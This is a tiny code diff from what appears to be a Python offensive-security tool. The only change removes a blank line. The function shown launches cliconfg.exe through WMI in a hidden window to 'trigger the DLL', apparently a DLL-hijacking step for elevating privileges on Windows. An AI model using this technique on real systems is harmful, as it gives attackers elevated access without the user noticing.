@@ -108,7 +108,6 @@ def cliconfg(payload):
 	"""
 	Run the executable to trigger the DLL
 	"""		
-
 	print_info("Attempting to run cliconfg executable")
 	cliconfg = wmi.Win32_Process.Create(CommandLine="cmd.exe /c {}\cliconfg.exe".format(system_directory()),
 						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
